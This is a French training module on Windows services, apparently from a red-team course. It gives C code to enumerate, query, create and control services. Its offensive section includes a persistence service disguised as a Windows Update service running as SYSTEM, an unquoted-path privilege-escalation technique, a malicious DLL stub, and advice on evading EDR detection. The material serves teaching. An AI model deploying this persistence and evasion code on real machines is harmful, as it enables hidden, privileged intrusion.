# Module W06 : Services Windows

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre l'architecture des services Windows
- Créer et contrôler des services programmatiquement
- Énumérer et interroger les services existants
- Exploiter les services pour la persistence et l'élévation de privilèges

---

## 1. Qu'est-ce qu'un Service Windows ?

### 1.1 Concept

**Analogie** : Un service est comme un **gardien de nuit** qui travaille en arrière-plan sans interface graphique. Il démarre automatiquement au boot, tourne continuellement, et effectue des tâches système.

**Service Windows** : Programme qui s'exécute en arrière-plan, géré par le **Service Control Manager (SCM)**.

```ascii
┌──────────────────────────────────────────┐
│       SERVICE CONTROL MANAGER (SCM)      │
│           services.exe                   │
├──────────────────────────────────────────┤
│  Gère tous les services                  │
│  - Démarrage/Arrêt                       │
│  - Surveillance                          │
│  - Communication                         │
└────────┬─────────────────────────────────┘
         │
         ├─►  Service 1 (Print Spooler)
         ├─►  Service 2 (Windows Update)
         ├─►  Service 3 (DNS Client)
         └─►  Service N (Custom Service)
```

### 1.2 Types de Services

| Type | Description | Démarrage |
|------|-------------|-----------|
| `SERVICE_AUTO_START` | Démarre au boot | Automatique |
| `SERVICE_DEMAND_START` | Démarre manuellement | Manuel |
| `SERVICE_DISABLED` | Désactivé | Jamais |
| `SERVICE_BOOT_START` | Démarre très tôt (drivers) | Boot |
| `SERVICE_SYSTEM_START` | Démarre pendant init système | System |

### 1.3 États d'un Service

```ascii
STOPPED ──► STARTING ──► RUNNING ──► STOPPING ──► STOPPED
   │            │            │            │
   └────────────┴────────────┴────────────┘
        (Transitions possibles)
```

---

## 2. Énumérer les Services

### 2.1 OpenSCManager - Se Connecter au SCM

```c
SC_HANDLE OpenSCManagerA(
    LPCSTR lpMachineName,    // NULL = local
    LPCSTR lpDatabaseName,   // NULL = default
    DWORD  dwDesiredAccess   // SC_MANAGER_ENUMERATE_SERVICE
);
```

### 2.2 EnumServicesStatusEx - Lister les Services

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Ouvrir le SCM
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCManager) {
        printf("[-] Erreur OpenSCManager: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Connexion au SCM réussie\n");

    // Énumérer les services
    DWORD bytesNeeded, servicesReturned, resumeHandle = 0;

    // Première appel pour obtenir la taille nécessaire
    EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                          SERVICE_STATE_ALL, NULL, 0, &bytesNeeded,
                          &servicesReturned, &resumeHandle, NULL);

    // Allouer le buffer
    BYTE *buffer = (BYTE*)malloc(bytesNeeded);

    // Énumérer
    if (EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                              SERVICE_STATE_ALL, buffer, bytesNeeded, &bytesNeeded,
                              &servicesReturned, &resumeHandle, NULL)) {

        ENUM_SERVICE_STATUS_PROCESSA *services = (ENUM_SERVICE_STATUS_PROCESSA*)buffer;

        printf("[+] %lu services trouvés:\n\n", servicesReturned);
        printf("%-30s %-15s %s\n", "Nom", "État", "Chemin");
        printf("───────────────────────────────────────────────────────────\n");

        for (DWORD i = 0; i < servicesReturned; i++) {
            const char *state = (services[i].ServiceStatusProcess.dwCurrentState == SERVICE_RUNNING)
                                ? "RUNNING" : "STOPPED";

            printf("%-30s %-15s %s\n",
                   services[i].lpServiceName,
                   state,
                   services[i].lpDisplayName);
        }
    }

    free(buffer);
    CloseServiceHandle(hSCManager);
    return 0;
}
```

---

## 3. Interroger un Service

### 3.1 OpenService et QueryServiceStatus

```c
#include <windows.h>
#include <stdio.h>

void queryService(const char *serviceName) {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return;

    // Ouvrir le service
    SC_HANDLE hService = OpenServiceA(hSCManager, serviceName, SERVICE_QUERY_STATUS);
    if (!hService) {
        printf("[-] Service '%s' introuvable\n", serviceName);
        CloseServiceHandle(hSCManager);
        return;
    }

    // Interroger le statut
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;

    if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO,
                             (BYTE*)&ssp, sizeof(ssp), &bytesNeeded)) {

        printf("[+] Service: %s\n", serviceName);
        printf("    État: %s\n", (ssp.dwCurrentState == SERVICE_RUNNING) ? "RUNNING" : "STOPPED");
        printf("    PID: %lu\n", ssp.dwProcessId);
        printf("    Type: 0x%lx\n", ssp.dwServiceType);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}

int main() {
    queryService("Spooler");  // Print Spooler
    return 0;
}
```

---

## 4. Créer un Service

### 4.1 CreateService - Installer un Service

```c
SC_HANDLE CreateServiceA(
    SC_HANDLE hSCManager,
    LPCSTR    lpServiceName,         // Nom du service
    LPCSTR    lpDisplayName,         // Nom d'affichage
    DWORD     dwDesiredAccess,       // SERVICE_ALL_ACCESS
    DWORD     dwServiceType,         // SERVICE_WIN32_OWN_PROCESS
    DWORD     dwStartType,           // SERVICE_AUTO_START
    DWORD     dwErrorControl,        // SERVICE_ERROR_NORMAL
    LPCSTR    lpBinaryPathName,      // Chemin de l'exécutable
    LPCSTR    lpLoadOrderGroup,
    LPDWORD   lpdwTagId,
    LPCSTR    lpDependencies,
    LPCSTR    lpServiceStartName,    // NULL = LocalSystem
    LPCSTR    lpPassword
);
```

### 4.2 Exemple Complet - Créer un Service

```c
#include <windows.h>
#include <stdio.h>

int createMyService(const char *serviceName, const char *binaryPath) {
    // Ouvrir le SCM avec droits de création
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        printf("[-] OpenSCManager échoué: %lu\n", GetLastError());
        return 1;
    }

    // Créer le service
    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        serviceName,              // Nom du service
        serviceName,              // Nom d'affichage
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,       // Démarre au boot
        SERVICE_ERROR_NORMAL,
        binaryPath,               // Chemin de l'exe
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        printf("[-] CreateService échoué: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return 1;
    }

    printf("[+] Service '%s' créé avec succès\n", serviceName);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int main() {
    createMyService("MyBackdoorService", "C:\\Tools\\backdoor.exe");
    return 0;
}
```

---

## 5. Contrôler un Service

### 5.1 StartService - Démarrer

```c
SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
SC_HANDLE hService = OpenServiceA(hSCManager, "MyService", SERVICE_START);

if (StartServiceA(hService, 0, NULL)) {
    printf("[+] Service démarré\n");
} else {
    printf("[-] Erreur démarrage: %lu\n", GetLastError());
}

CloseServiceHandle(hService);
CloseServiceHandle(hSCManager);
```

### 5.2 ControlService - Arrêter/Pauser

```c
SC_HANDLE hService = OpenServiceA(hSCManager, "MyService", SERVICE_STOP);

SERVICE_STATUS ss;
if (ControlService(hService, SERVICE_CONTROL_STOP, &ss)) {
    printf("[+] Service arrêté\n");
}
```

### 5.3 DeleteService - Supprimer

```c
SC_HANDLE hService = OpenServiceA(hSCManager, "MyService", DELETE);

if (DeleteService(hService)) {
    printf("[+] Service supprimé\n");
}
```

---

## 6. Créer un Service Exécutable

### 6.1 Structure d'un Service

Un service Windows doit implémenter une **table de dispatch** et une **fonction de contrôle**.

```c
#include <windows.h>
#include <stdio.h>

SERVICE_STATUS        g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;

// Fonction de contrôle du service
VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
        case SERVICE_CONTROL_STOP:
            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetEvent(g_ServiceStopEvent);
            break;
    }
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

// Fonction principale du service
VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
    // Enregistrer le handler
    g_StatusHandle = RegisterServiceCtrlHandlerA("MyService", ServiceCtrlHandler);

    // Initialiser le statut
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Créer event d'arrêt
    g_ServiceStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);

    // Service démarré
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Boucle principale du service
    while (WaitForSingleObject(g_ServiceStopEvent, 1000) != WAIT_OBJECT_0) {
        // Faire le travail du service ici
        // Exemple : écrire dans un fichier log
    }

    // Nettoyage
    CloseHandle(g_ServiceStopEvent);
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

int main() {
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        {"MyService", ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcherA(ServiceTable)) {
        printf("[-] StartServiceCtrlDispatcher échoué\n");
    }

    return 0;
}
```

---

## 7. Applications Offensives

### 7.1 Contexte Red Team

Les services sont **cruciaux** pour :

1. **Persistence** : Service auto-start = exécution au boot
2. **Élévation de Privilèges** : Services qui tournent en SYSTEM
3. **Lateral Movement** : Créer des services sur machines distantes
4. **Defense Evasion** : Service légitime vs malware

### 7.2 Technique - Service Persistence

```c
#include <windows.h>
#include <stdio.h>

int installBackdoorService() {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return 1;

    // Créer service de persistence
    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        "WindowsUpdateService",  // Nom légitime
        "Windows Update Service", // Description légitime
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,      // Démarre au boot
        SERVICE_ERROR_IGNORE,
        "C:\\Windows\\System32\\svchost.exe", // Peut être votre backdoor
        NULL, NULL, NULL,
        "LocalSystem",           // Tourne en SYSTEM !
        NULL
    );

    if (hService) {
        printf("[+] Service de persistence installé\n");

        // Ajouter une description
        SERVICE_DESCRIPTIONA desc;
        desc.lpDescription = "Manages updates for Windows";
        ChangeServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, &desc);

        CloseServiceHandle(hService);
    }

    CloseServiceHandle(hSCManager);
    return 0;
}
```

### 7.3 Technique - Service Unquoted Path

**Principe** : Si un chemin de service n'est pas entre guillemets et contient des espaces, Windows cherche l'exécutable dans plusieurs emplacements.

**Exemple vulnérable** :
```
C:\Program Files\Vulnerable App\service.exe

Windows cherche dans cet ordre:
1. C:\Program.exe
2. C:\Program Files\Vulnerable.exe
3. C:\Program Files\Vulnerable App\service.exe
```

**Exploitation** :
```c
// Placer un malware en C:\Program.exe
// Si le service redémarre avec privilèges SYSTEM, notre malware s'exécute !
```

### 7.4 Technique - Service DLL Hijacking

```c
#include <windows.h>

// DLL malveillante compilée comme service
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Code malveillant ici (reverse shell, etc.)
        WinExec("cmd.exe /c calc.exe", SW_HIDE);
    }
    return TRUE;
}

VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
    // Faire croire qu'on est un vrai service
}
```

### 7.5 Considérations OPSEC

**Problèmes détectés** :

1. **Création de service** : Très surveillée par les EDR (Event ID 7045)
   - **Solution** : Modifier un service légitime existant

2. **Service avec nom suspect** : "backdoor", "malware"
   - **Solution** : Noms légitimes ("Windows Update", "Driver Service")

3. **Binaire suspect** : Signature manquante, chemin inhabituel
   - **Solution** : Signed binaries, emplacements System32

4. **Service qui ne répond pas** : SCM peut le tuer
   - **Solution** : Implémenter correctement le protocole de service

---

## 8. Checklist

- [ ] Comprendre l'architecture SCM/Services
- [ ] Énumérer les services avec `EnumServicesStatusEx`
- [ ] Créer un service avec `CreateService`
- [ ] Contrôler un service (Start/Stop/Delete)
- [ ] Implémenter un service complet en C
- [ ] Exploiter les services pour la persistence
- [ ] Comprendre les implications OPSEC

---

## 9. Exercices

Voir [exercice.md](exercice.md)

---

## 10. Ressources Complémentaires

- [MSDN - Services](https://docs.microsoft.com/en-us/windows/win32/services/services)
- [MSDN - Service Control Manager](https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager)
- [CreateService Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [MITRE ATT&CK - T1543.003 (Windows Service)](https://attack.mitre.org/techniques/T1543/003/)

---

**Navigation**
- [Module précédent](../W05_registry/)
- [Module suivant](../W07_wmi_basics/)
